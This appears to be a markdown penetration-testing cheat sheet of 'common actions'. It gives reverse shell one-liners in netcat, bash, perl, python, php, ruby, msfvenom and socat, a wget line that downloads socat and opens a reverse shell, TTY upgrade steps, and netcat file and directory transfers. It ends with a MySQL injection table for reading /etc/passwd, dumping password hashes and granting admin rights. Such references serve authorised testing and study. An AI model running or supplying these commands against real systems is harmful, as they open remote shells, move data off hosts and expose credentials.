# common actions

**table of contents**:

- [shells](#shells)
  * [reverse shells](#reverse-shells)
    + [netcat](#netcat)
    + [bash](#bash)
    + [perl](#perl)
    + [python](#python)
    + [php](#php)
    + [ruby](#ruby)
    + [msfvenom](#msfvenom)
    + [socat](#socat)
  * [spawning tty shells](#spawning-shells)
    + [python](#python)
    + [bash/sh](#bash/sh)
    + [perl](#perl)
    + [text editors](#within-text-editors)
      - [vi](#vi)
    + [nmap](#nmap)
    + [script](#script)
  * [making fully-interactive shells](#making-them-fully-interactive)
    + [working around spawning issues](#spawn-workarounds)
- [file transfers](#file-transfers)
  * [wget](#wget)
  * [netcat](#netcat)
    + [files](#SENDING-FILES-BETWEEN-SYSTEMS)
    + [directories](#SENDING-WHOLE-DIRECTORIES)
- [db injections](#db-injections)
  * [mysql](#mysql)
  * [postgres](#postgresql)

---

# shells

## reverse shells

### netcat

<small>sending:</small>
```
nc -e /bin/sh [LOCAL IP] [PORT]
```

<small>catching:</small>
```
nc -lvp [PORT]
```

<small>if the wrong version of netcat is installed, possible you could still get a shell by running:</small>
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LOCAL IP] [PORT] >/tmp/f
```

### bash

```
bash -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1
```

### perl

```
perl -e 'use Socket;$i="[LOCAL IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php

```
php -r '$sock=fsockopen("[LOCAL IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### ruby

```
ruby -rsocket -e'f=TCPSocket.open("[LOCAL IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### msfvenom

in `metasploit`, you can generate paylods (under `cmd/unix`) for making one-liner bind or reverse shells

_see what's available_:
```
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

_generate payload_:
```
msfvenom -p cmd/unix/reverse_netcat LHOST=[LOCAL IP] LPORT=[LOCAL PORT] R
```

### socat

socat can be used to pass full TTY’s over TCP connections, if it's installed on a victim server you can launch a reverse shell with it, but you have to catch the connection with `socat`.

_local_:
```
socat file:`tty`,raw,echo=0 tcp-listen:[PORT]
```

_remote_:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
```

<small>if it's not installed, it's possible to download it to a writable directory, chmod it, then execute a rev shell</small>
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
```

----
## spawning shells

#### **python**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **bash/sh**
```
/bin/sh -i
```
```
echo os.system('/bin/bash')
```

#### **perl**
```
perl -e 'exec "/bin/sh";'
```

#### **within text editors**:

##### _vi_:
```
:!bash
```
```
:set shell=/bin/bash:shell
```

#### **nmap**:
```
!sh
```

#### **script**

```
## this method can potentially avoid needing to do all the stty/fg/bg work below
/usr/bin/script -qc /bin/bash /dev/null
```

----
## making them fully interactive

when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:

_non-interactive shell_:
```
## get partially interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

_remote shell_:
```
## background process netcat in the remote shell by hitting CTRL+Z
user@remote:$ ^Z
```
_local env_:
```
## get rows/cols values from your current env
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

## so you can pass keyboard shortcuts, bring netcat back to the foreground 
user@local:~$ stty raw -echo; fg
```
<small>**[ZSH NOTE]**: zsh, specifically, only respects the -echo until the next prompt which means that you need to type your next command all in one line</small>

_remote env_:
```
## set the correct sizes for the remote shell
user@remote:~$ stty rows [ROWS] cols [COLS]

## export shell to ENV
export SHELL=/bin/bash

## enable colors
user@remote:~$ export TERM=xterm-256color

## reload shell to apply the TERM variable
user@remote:~$ reset 
OR
user@remote:~$ exec /bin/bash
```

#### spawn workarounds

_for non-responsive shell spawning when you need to change users_

first start a listening on your local host machine:

```
nc -nlvp [PORT]
```

then, from the remote/target machine:

```
echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
```

---

## file transfers

### wget

**usecase**: fetch files/scripts from your local machine on the remote host

_sender_:
```
cd souce_directory
python -m http.server 
```

_'receiver' (more accurately, a fetcher here)_:
```
## python http server always starts by default at port 8000
## unless otherwise specified
wget http://[LOCAL IP]:8000/[FILE YOU WANT]
```

### netcat

##### SENDING FILES BETWEEN SYSTEMS

_receiver_:

start a listener and provide the name you want to give the sent file

```
nc -l -p [PORT] > [FILENAME]
```

_sender_:
```
nc -w 3 [RECEIVER IP] [PORT] < [FILENAME]
```

##### SENDING WHOLE DIRECTORIES

_receiver_:

maybe first create a separate directory if you want one, since this is going to send multiple files, then `cd` into it and start a `netcat` listener

```
nc -l -p [PORT] | tar xf -
```

_sender_:

```
cd source_directory
tar cf - . | nc [RECEIVER IP] [PORT]
```
---

# DB injections

## MySQL

|operation|sql|
|---|---|
|version|`SELECT @@version`|
|current user|`SELECT user();` or `SELECT system_user();`|
|get comments|`SELECT 1; #comment` or `SELECT /*comment*/1;`|
|list users|`SELECT user FROM mysql.user; — priv`|
|list password hashes|`SELECT host, user, password FROM mysql.user; — priv`|
|list DBA accounts|`SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv`|
|list databases|`SELECT schema_name FROM information_schema.schemata; SELECT distinct(db) FROM mysql.db — priv`|
|current db|`SELECT database()`
|list tables|`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`
|list columns|`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`|
|find tables from column name|`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’`|
|if statement|`SELECT if(1=1,’foo’,'bar’); — returns ‘foo’`|
|concat|`SELECT CONCAT(‘A’,'B’,'C’); # returns ABC`|
|substr|`SELECT substr(‘abcd’, 3, 1); # returns c`|
|local file access|`…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)` — priv, can only read world-readable files. `SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system`|
|hostname, IP|`SELECT @@hostname;`|
|create user|`CREATE USER test1 IDENTIFIED BY ‘pass1′;`|
|delete user|`DROP USER test1;`|
|make DBA user|`GRANT ALL PRIVILEGES ON *.* TO test1@’%';`|
|location of db files|`SELECT @@datadir;`|
|default/system db|`information_schema (>= mysql 5.0)`|

## PostgresQL

|operation|sql|
|---|---|
|version|`SELECT version()`|
